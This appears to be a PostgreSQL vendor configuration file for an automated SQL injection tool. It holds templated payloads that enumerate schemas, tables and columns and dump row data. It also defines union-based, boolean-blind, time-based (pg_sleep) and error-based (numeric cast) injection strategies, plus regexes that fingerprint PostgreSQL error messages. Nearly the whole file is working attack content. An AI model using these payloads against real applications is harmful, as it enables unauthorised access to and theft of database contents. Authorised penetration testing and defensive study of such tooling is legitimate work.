vendor: PostgreSQL

resource:
 info: |
  /* Method concat_ws exists since pg 9.1 only
     concat_ws(
         '${enclose_value_sql}',
         version(),
         current_database(),
         user
     ) */
  version()
  || '${enclose_value_sql}'
  || current_database()
  || '${enclose_value_sql}'
  || user
  || '${trail_sql}'

 schema:
  database: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   select
                       tables.table_schema r,
                       count(table_name) q
                   from information_schema.tables
                   group by r
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )
       || '${trail_sql}'

  table: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   select
                       tables.table_name r,
                       '0' q
                   from information_schema.tables
                   where tables.TABLE_SCHEMA = '${database}'
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )
       || '${trail_sql}'

  column: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   select
                       columns.column_name r,
                       '0' q
                   from information_schema.columns
                   where columns.TABLE_SCHEMA = '${database}'
                   and columns.TABLE_name = '${table}'
                   order by r
                   ${limit}
               )x
           ),
           '${separator_cell_sql}'
       )
       || '${trail_sql}'

  row:
   query: |
    select
        array_to_string(
            array(
                select
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
                    || q::text
                    || '${enclose_value_sql}'
                from (
                    select
                        substr((${fields}), 1, 775) r,
                        count(*) q
                    from ${database}.${table}
                    group by r
                    ${limit}
                )x
            ),
            '${separator_cell_sql}'
        )
        || '${trail_sql}'
   fields:
    field: trim(coalesce(${field.value}::text, ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       /* If reach end of string (${lead}i) then NULLIF nullifies the result */
       '${lead}'
       || nullif(
           substr(
               (${injection}),
               ${window.char},
               65536
           ),
           '${trail_sql}'
       )
  limit: limit 65536 offset ${limit.value}
  failsafe: (1337${indice}7330%2b1)::text
  calibrator: repeat(chr(35), 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    # Spring
    - Unterminated string literal started at position \\d+ in SQL .*. Expected .* char
    - Unterminated identifier started at position \\d+ in SQL .*. Expected .* char
    - 'ERROR: syntax error at or near ".*"[\\r\\n]+  Position: \\d+'
    - 'ERROR: syntax error at end of input[\\r\\n]+  Position: \\d+'
    # Other
    - "ERROR: unterminated quoted identifier at or near"
    - "Query failed: ERROR:  unterminated quoted string at or near"
    - function\\.pg
    - PostgreSQL
   orderByErrorMessage:
    - ORDER BY position 1337 is not in select list

 normal:
  indices: union select ${indices}
  capacity: (select '${lead}' || ${indice} || ${calibrator})
  orderBy: order by 1337

 boolean:
  test:
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != (
        ascii(
            substr(
                (${injection}),
                ${window.char},
                1
            )
        )
        %26 ${bit}
    )
   length: char_length((${injection})) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}
  time: |
   ${boolean.mode} ''=''
   || (
       select
           case when ${test}
           then ''
           else pg_sleep(${sleep_time})
       end
   )

 error:
  method:
  
   - name: Cast:or
     query: |
      /* ERROR: invalid input syntax for type numeric: "<sqli>" */
      or 1 = cast((
          ${window}
          )::text as numeric
      )
     capacity: 255
     
   - name: Cast:and
     query: |
      and 1 = cast((
          ${window}
          )::text as numeric
      )
     capacity: 255
     
   - name: Cast:order by
     query: |
      1, cast((
          ${window}
          )::text as numeric
      )
     capacity: 255